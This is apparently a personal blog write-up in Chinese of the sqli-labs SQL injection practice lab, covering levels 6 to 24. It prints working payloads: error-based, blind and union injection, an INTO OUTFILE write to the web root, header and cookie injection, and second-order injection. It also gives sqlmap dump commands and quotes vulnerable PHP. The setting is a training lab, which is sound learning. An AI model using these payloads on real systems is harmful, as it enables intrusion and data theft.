<p>网上查了一下 double injection ，有人说是因为有两个select所以叫双查询？？？</p>
<h1 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h1><p>同 less-5 单引号换成双引号</p>
<h1 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h1><p>id=1时提示</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You are <span class="keyword">in</span><span class="params">...</span>. Use outfile<span class="params">...</span><span class="params">...</span></span><br></pre></td></tr></table></figure>

<p>id=-1时提示</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have <span class="keyword">an</span> <span class="keyword">error</span> <span class="keyword">in</span> your SQL <span class="keyword">syntax</span></span><br></pre></td></tr></table></figure>

<p>猜测 没查询到数据 以及 sql语句语法错误 都提示 “You have an error in your SQL syntax”</p>
<p>不显示报错信息所以无法使用报错注入。不过根据 id 的值是否在数据库中，返回不同的页面，所以应该也可以使用布尔盲注，但既然给了提示使用 outfile ，那就先试试 outfile</p>
<p>使用 outfile 之前，先要修改 mysql 的配置文件 （可以在启动mysql时使用命令行参数，但感觉不是很方便）</p>
<table>
<thead>
<tr>
<th align="left">secure_file_priv 的值</th>
<th>解释</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">(NULL)</td>
<td>我使用的mysql版本默认值为这个，配置文件中没有 secure_file_priv 就为这个值</td>
<td>不允许使用 outfile</td>
</tr>
<tr>
<td align="left">‘’</td>
<td>配置文件中直接 secure_file_priv=  或者 ‘’ 或者 “” 都是这个</td>
<td>允许 outfile 将文件导出到任意目录（可能还需要mysql有相关权限吧。使用的是windows系统，不太熟悉windows的权限管理）</td>
</tr>
<tr>
<td align="left">‘c:/test’</td>
<td>一个具体的路径</td>
<td>只允许将文件导出到指定目录及其子目录</td>
</tr>
</tbody></table>
<p>mysql运行时查询该变量的值，变量名不太记得可以用通配符 ‘%’，运行时无法在mysql中使用set修改该变量</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW <span class="keyword">VARIABLES</span> LIKE <span class="comment">&#x27;secure_file_priv&#x27;</span>;</span><br></pre></td></tr></table></figure>



<p>导出路径可以是 绝对路径 也可以是 相对路径</p>
<p>绝对路径没什么好说的，相对路径则和配置文件中的 datadir 有关</p>
<p>假设 datadir=c:/home/test_of_outfile ，sqli-labs使用的数据库名为 security</p>
<p>相对路径 ‘test1.txt’ 导出的文件存放在 c:/home/test_of_outfile/security/test1.txt</p>
<p>同样，datadir 也不能使用 set 修改，可以在配置文件中修改</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注意，如果修改 datadir 修改后，要将原来datadir中的文件拷贝到新的datadir中，否则mysql无法启动</span><br></pre></td></tr></table></figure>

<p>推荐一款软件，Everything ，可以查找计算机上的文件，还挺快的，一开始不知道相对路径是相对哪，就是拿这个找的</p>
<p>输出文件要选个可以访问的路径，我放在了网站的根目录下。因为sql语句执行没有返回数据，所以会提示错误，但文件已经导出了</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="string">&#x27;)) union select &#x27;</span>a<span class="string">&#x27;,&#x27;</span><span class="string">b&#x27;,&#x27;</span>c<span class="string">&#x27; union select 1,2,3 into outfile &#x27;</span>C:<span class="regexp">/tools/</span>phpstudy_pro<span class="regexp">/WWW/</span>test111.txt<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>

<p>文件内容 16进制表示为（0x0A 是 换行符LF (\n) win7记事本中显示不出来，windows中的换行是CRLF (\r\n) ，0x09 是水平制表符 (\t) ）</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">61</span> <span class="number">09</span> <span class="number">62</span> <span class="number">09</span> <span class="number">63</span> <span class="number">0</span>A <span class="number">31</span> <span class="number">09</span> <span class="number">32</span> <span class="number">09</span> <span class="number">33</span> <span class="number">0</span>A</span><br></pre></td></tr></table></figure>



<p>测试是单引号还是双引号时，可以使用</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1&#x27;</span><br><span class="line">?<span class="attribute">id</span>=1&quot;</span><br></pre></td></tr></table></figure>

<p>有数据的表示不是使用这种引号</p>
<p>mysql中的字符型和整型比较，有点像php的弱类型比较</p>
<p>1 == ‘1abc’</p>
<h1 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h1><p>也可以outfile</p>
<p>标题上面写了盲注</p>
<p>那就试试sqlmap的布尔盲注吧</p>
<p>我是用 pip 安装的 sqlmap，发现安装完之后在python的安装目录下的 Scripts 中有一个 sqlmap.exe ，然后这个目录又在环境变量Path中，所以可以直接  <code> sqlmap -u url</code> 而不需要 <code>python sqlmap.py -u</code> 。</p>
<p>顺便提一嘴，sqlmap.py 中第一行指定了解释器，所以命令行里面可以直接运行 sqlmap.py 而不是作为python的命令行参数。但第一行指定的解释器文件名是 python，如果把 python.exe 改成了 python3.exe，就不能运行了，sqlmap.exe也不能运行了</p>
<figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python</span></span><br></pre></td></tr></table></figure>



<p>运行如下命令，运行过程中会有几个选项，[y/N] 代表 y(es) 或 n(o) ，大写表示默认值，大部分情况直接回车使用默认值即可。–technique表示使用什么方法，B表示布尔盲注</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:<span class="regexp">//g</span>ame.local.com<span class="regexp">/sqli-labs-master/</span>Less-<span class="number">8</span>/?id=<span class="number">1</span> --technique=B</span><br></pre></td></tr></table></figure>

<p>运行完一次后会有缓存文件，记录之前的结果，再接着看当前数据库</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:<span class="regexp">//g</span>ame.local.com<span class="regexp">/sqli-labs-master/</span>Less-<span class="number">8</span>/?id=<span class="number">1</span> --technique=B --current-db</span><br></pre></td></tr></table></figure>

<p>看表名 -D 后面指定数据库名字</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:<span class="regexp">//g</span>ame.local.com<span class="regexp">/sqli-labs-master/</span>Less-<span class="number">8</span>/?id=<span class="number">1</span> --technique=B -D security --tables</span><br></pre></td></tr></table></figure>

<p>列名 -T 后面指定表名</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:<span class="regexp">//g</span>ame.local.com<span class="regexp">/sqli-labs-master/</span>Less-<span class="number">8</span>/?id=<span class="number">1</span> --technique=B -D security -T emails --columns</span><br></pre></td></tr></table></figure>

<p>最后，查看emails中的数据，-C 指定列名</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:<span class="regexp">//g</span>ame.local.com<span class="regexp">/sqli-labs-master/</span>Less-<span class="number">8</span>/?id=<span class="number">1</span> --technique=B -D security -T emails -C id,email_id --dump</span><br></pre></td></tr></table></figure>



<p>url 可以用双引号包裹，但不能用单引号，我用单引号直接提示我 invalid target URL</p>
<p>生成的缓存文件的目录以单引号开头</p>
<h1 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h1><p>不管id为什么，都是一样的界面。尝试基于时间的盲注。这种方法是最耗时间的</p>
<p>判断单双引号还是整型，if函数 类似三元运算符  (1==1) ? sleep(1) : 0</p>
<p>sql语句若是错误则不会调用sleep函数，响应时间就没那么久</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=&#x27; <span class="keyword">or</span> <span class="keyword">if</span>(<span class="number">1</span>=<span class="number">1</span>,sleep(<span class="number">1</span>),<span class="number">0</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>虽然是sleep(1)，但响应时间有点小久，不知道是为什么</p>
<p>sqlmap把–technique=B 改为 =T ，其他和less-8一样，但是要花比较长的时间，有[Y/n]选一下就好，一般默认值就行</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:<span class="regexp">//g</span>ame.local.com<span class="regexp">/sqli-labs-master/</span>Less-<span class="number">9</span>/?id=<span class="number">1</span> --technique=T --current-db</span><br></pre></td></tr></table></figure>



<h1 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h1><p>同 less-9 ，单引号改双引号</p>
<h1 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h1><p>http请求方法改为post</p>
<p>有报错信息</p>
<p>报错注入，在表单任意一个字段 (Username 或 Password)中填入，表单中 + 不能代表空格，井号也不需要url编码，所以直接用井号注释</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; <span class="keyword">or</span> <span class="built_in">updatexml</span>(<span class="number">1</span>,<span class="built_in">concat</span>(<span class="number">0x7e</span>,(<span class="built_in">select</span> <span class="built_in">database</span>()),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="meta">#</span></span><br></pre></td></tr></table></figure>



<p>get改为post其实没有什么区别，基本上一样吧，感觉有点水</p>
<p>分屏写的，浏览器下面一半hackbar，上面一半网页，屏幕太小，没看到登录成功或者失败的信息，我还以为怎么get改post都放在不同的lesson，却直接跳到了报错注入，不从字符型开始水一遍</p>
<h1 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h1><p>sqli-labs 前面这些表单都没有检查是否有数据，所以有一个字段直接空着也行。有些和之前使用get时基本一致，所以 开摆！</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;) or 1=1#</span></span><br></pre></td></tr></table></figure>



<h1 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h1><p>报错注入</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) <span class="keyword">or</span> <span class="built_in">updatexml</span>(<span class="number">1</span>,<span class="built_in">concat</span>(<span class="number">0x7e</span>,(<span class="built_in">select</span> <span class="built_in">database</span>()),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="meta">#</span></span><br></pre></td></tr></table></figure>



<h1 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h1><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; or updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure>



<h1 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h1><p>盲注</p>
<p>sqlmap  get 和 post 使用方法不太一样</p>
<p>常用的方法是 burp suite 抓个包，把http请求保存在一个文件里，然后 <code>-r &quot;&lt;path&gt;&quot;</code> 让sqlmap从文件中读取数据</p>
<p>但我刚好不太想打开burp suite，所以试试别的方法</p>
<p>–from参数，自动探测表单，一路狂回车</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://game.local.com/sqli-labs-master/Less-15/&quot;</span> <span class="params">--forms</span> <span class="params">--current-db</span> <span class="params">--technique=T</span></span><br></pre></td></tr></table></figure>



<p>–data=”<params>“，手动指定参数</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://game.local.com/sqli-labs-master/Less-15/&quot;</span> <span class="params">--data=</span><span class="string">&quot;uname=1&amp;passwd=2&amp;submit=Submit&quot;</span> <span class="params">--current-db</span> <span class="params">--technique=T</span></span><br></pre></td></tr></table></figure>



<p>sqlmap 布尔盲注成不了，可能是因为登录成功和登录失败最明显的就一个图片的url不一样，相差不大，sqlmap 判断不出来，虽然在浏览器里看得很明显。</p>
<h1 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h1><p>好像就多个括号？</p>
<p>摆了</p>
<h1 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h1><p>注入点变了，看到修改密码觉得有update语句，然后没有token 又不验证旧密码，csrf</p>
<p>查看源代码，username必须是数据库中已有数据，否则什么信息都不给</p>
<p>username对了之后就有报错信息，可以报错注入</p>
<p>new password 如下时可以进行基于时间的盲注。sleep(1) 好像表示暂停10秒，不是一秒，sleep函数太多记混了（后来测试又是1秒？？不知道是什么情况，之前测试sleep(3) 等了半分钟）（之后发现可能和表中有多少列有关）</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">123</span>&#x27; where if(<span class="number">1</span>=<span class="number">1</span>,sleep(<span class="number">1</span>),<span class="number">0</span>)#</span><br></pre></td></tr></table></figure>

<p>布尔盲注好像不太行，username 有过滤，而username对了之后，只要不报错，显示的页面都一样</p>
<p>new password值如下时，可修改所有用户的密码，也就是加了个 ‘#</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">456</span>&#x27;<span class="comment">#</span></span><br></pre></td></tr></table></figure>



<p>有个有意思的东西，他直接把数据库中查出来的数据拼接到sql语句中，可以试一下二次注入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username= <span class="subst">$uname</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);</span><br><span class="line"><span class="variable">$row1</span> = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$update</span>=<span class="string">&quot;UPDATE users SET password = &#x27;<span class="subst">$passwd</span>&#x27; WHERE username=&#x27;<span class="subst">$row1</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>我们手动插入一条数据</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> users(`username`, `password`) <span class="keyword">VALUES</span> (<span class="string">&#x27;test\&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#<span class="string">&#x27;, &#x27;</span><span class="number">123</span><span class="string">&#x27;);</span></span><br></pre></td></tr></table></figure>

<p>php代码中转义了单引号</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>所以可以正确处理username中的单引号，输入username如下，不要反引号</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">test</span>&#x27; or <span class="number">1</span>=<span class="number">1</span>#</span><br></pre></td></tr></table></figure>

<p>密码随便来一个，提交后发现，所有用户密码全被改了，注入成功</p>
<p>不过想要数据库中存在一条数据为 <code>test&#39; or 1=1#</code> 比较困难，得配合其他网页尝试插入这条数据</p>
<h1 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h1><p>输入正常的用户名和密码，发现此网页会打印 user agent 的值，User-Agent 是http请求头的一个字段。查看源码，发现他会把 user agent 和 ip 地址插入数据库，类似一个日志功能，发生注入问题的代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;, <span class="subst">$uname</span>)&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>有报错信息，可以报错注入。不想开burp suite，所以用 hackbar 改变 User-Agent。登录时需要使用正确的用户密码，先登录一次，在f12开发者工具里的 network 中抓个包，看一看post请求体的内容</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin<span class="variable">&amp;passwd</span>=admin<span class="variable">&amp;submit</span>=Submit</span><br></pre></td></tr></table></figure>

<p>hackbar 中的 enctype 应该和请求头中的 Content-Type 一样</p>
<p>设置好 url ，启用 post 方法，但我设置请求体时，submit=Submit 要去掉，不去掉 hackbar 报错，不太清楚是什么原因。submit字段也用不到，直接去掉就好，最后请求体如下</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">uname</span>=admin&amp;passwd=admin</span><br></pre></td></tr></table></figure>

<p>设置 User-Agent</p>
<p>报错注入sql语句不能有语法错误，values 后面的字段数量必须和 values 前面一样，不清楚 user agent 后面还有没有别的字段的话，可以多尝试几次，最后尝试到没有报错的值为</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abc<span class="string">&#x27;, &#x27;</span><span class="number">112&#x27;</span>, <span class="string">&#x27;asd&#x27;</span>)<span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p>报错注入如下，选一个字段换成那几个就行</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">abc</span>&#x27;, extractvalue(<span class="number">0</span>x<span class="number">0</span>a,concat(<span class="number">0</span>x<span class="number">0</span>a,(select database()))), &#x27;asd&#x27;)#</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27;,&#x27;<span class="number">2</span>&#x27;,&#x27;<span class="number">3</span>&#x27;), (&#x27;<span class="number">1</span>&#x27;,&#x27;<span class="number">2</span>&#x27;,extractvalue(<span class="number">0</span>x<span class="number">0</span>a,concat(<span class="number">0</span>x<span class="number">0</span>a,(select database()))))#</span><br></pre></td></tr></table></figure>

<p>适用于user agent 是插入的最后一个字段</p>
<p>时间盲注可行，布尔盲注应该不行</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27;,&#x27;<span class="number">2</span>&#x27;,&#x27;<span class="number">3</span>&#x27;), (&#x27;<span class="number">1</span>&#x27;,&#x27;<span class="number">2</span>&#x27;,if(<span class="number">1</span>=<span class="number">1</span>, sleep(<span class="number">3</span>), <span class="number">0</span>))#</span><br></pre></td></tr></table></figure>



<h1 id="less-19"><a href="#less-19" class="headerlink" title="less-19"></a>less-19</h1><p>跟 less-18 类似，User-Agent 换成了 Referer。Referer 也是请求头中的一个字段，据说这个单词正确写法是referrer，但是以前写错了，所以就沿用了 Referer。</p>
<p>除了插入的列数不一样，其他都一样</p>
<p>报错注入</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27;,&#x27;<span class="number">2</span>&#x27;), (&#x27;<span class="number">1</span>&#x27;,extractvalue(<span class="number">0</span>x<span class="number">0</span>a,concat(<span class="number">0</span>x<span class="number">0</span>a,(select database()))))#</span><br></pre></td></tr></table></figure>

<p>时间盲注</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27;,&#x27;<span class="number">2</span>&#x27;), (&#x27;<span class="number">1</span>&#x27;,if(<span class="number">1</span>=<span class="number">1</span>, sleep(<span class="number">3</span>), <span class="number">0</span>))#</span><br></pre></td></tr></table></figure>



<h1 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h1><p>post方法提交表单后，设置cookie，重定向到get方法请求的 index.php ，提交表单后重定向到get方法请求的页面是一种比较常见的做法，可以防止刷新时重复提交表单。发送请求时，如果请求的是一个目录，会自动寻找目录中的 index 文件，如 index.html , index.php之类的</p>
<p> cookie 也可以在 http请求头中找到，也可以在其他地方查看。临时改变 cookie ，可以在hackbar中改变 cookie 字段的值。若是要持久修改cookie，谷歌浏览器插件 Edit This Cookie 可以比较方便的修改cookie。</p>
<p>hackbar中，cookie值改为如下所示，可以采用联合注入</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=&#x27; <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="built_in">database</span>(),<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p>报错信息也有</p>
<h1 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h1><p>看标题有个base64，使用admin登录，发现cookie是 <code>YWRtaW4%3D</code> base64编码最后可能出现等号，%3D 应该是 = 的 url 编码，拿 <code>YWRtaW4=</code> 去解码，发现就是 admin</p>
<p>拿 Edit This Cookie 改cookie 改完后刷新网页。（后面试出来多个了圆括号）</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="built_in">database</span>(),<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p>拿去base64编码</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">JykgdW5pb24gc2VsZWN0IDEsZGF0YWJhc2UoKSwzIw</span>==</span><br></pre></td></tr></table></figure>

<p>等号换成  <code>%3D</code> ，cookie 中的 uname 改为如下值 （不换好像也行）</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JykgdW<span class="number">5</span>pb<span class="number">24</span>gc<span class="number">2</span><span class="attr">VsZWN0</span>IDEsZGF<span class="number">0</span>YWJhc<span class="number">2</span>UoKSwzIw<span class="meta">%</span><span class="number">3</span>D<span class="meta">%</span><span class="number">3</span>D</span><br></pre></td></tr></table></figure>

<p>成了</p>
<p>cookie中等号不用url编码也能正确处理，用了好像也行</p>
<p>看了一眼代码，没看到手动处理url编码的函数，wireshark 抓包也没看出什么，不管了</p>
<h1 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h1><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="number">3</span>#</span><br></pre></td></tr></table></figure>

<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">uname</span>=IiB<span class="number">1</span>bmlvbiBzZWxlY<span class="number">3</span>QgMSxkYXRhYmFzZSgpLDMj</span><br></pre></td></tr></table></figure>



<h1 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h1><p>过滤了注释符 # 和 – 。有报错信息，需要构造出一个没有语法错误的sql语句才可以使用报错注入</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?i</span>d=<span class="string">&#x27; or extractvalue(0x0a,concat(0x0a,(select database()))) or &#x27;</span></span><br></pre></td></tr></table></figure>

<p>时间盲注</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?i</span>d=<span class="string">&#x27; or if(1=1, sleep(3), 0) or &#x27;</span></span><br></pre></td></tr></table></figure>

<p>布尔盲注</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?i</span>d=<span class="string">&#x27; or if(1=1, 1, 0) or &#x27;</span></span><br></pre></td></tr></table></figure>



<p>（union后面没有from不能接where）联合查询，只有 2 能回显，或者 %00 截断</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">or</span> <span class="string">&#x27;1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> <span class="string">&#x27;1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;%00</span><br></pre></td></tr></table></figure>



<p>后来网上找到了一个有意思的</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span>(<span class="string">&#x27;-1&#x27;</span>)<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">||</span><span class="string">&#x27;a&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>这在mysql中可以正确执行，但是第三个字段从3变成了1，好像不管||后面是什么都是1</p>
<p>再试了一下</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span>(<span class="string">&#x27;-1&#x27;</span>)<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span>(<span class="string">&#x27;-1&#x27;</span>)<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>后来又看到了 %00 截断sql语句，不知道对版本有没有什么要求</p>
<h1 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h1><p>不知道什么原因 php文件少了几个，就先到这吧</p>
<p>未完待续。。。</p>
<p>后来发现这关和另一关有几个文件，文件名只有首字母大小写不一样（好像就24和40），windows中文件名好像不分大小写，导致文件名重复（win10 解压时提示临时文件文件名重复了）。</p>
<hr>

<p>标题 second degree injections ，二次注入（好像也有叫 二阶注入的）</p>
<p>和 less-17 我发现的二次注入一样，只不过这次多了个可以自己插入数据的页面，就不需要自己直接在mysql中插入数据了</p>
<p>创建新用户（插入数据）相关代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span>=  mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) ;</span><br><span class="line"><span class="variable">$pass</span>= mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into users ( username, password) values(\&quot;<span class="subst">$username</span>\&quot;, \&quot;<span class="subst">$pass</span>\&quot;)&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>修改密码相关代码，登陆时直接将用户名放到 $_SESSION[“username”] 中</p>
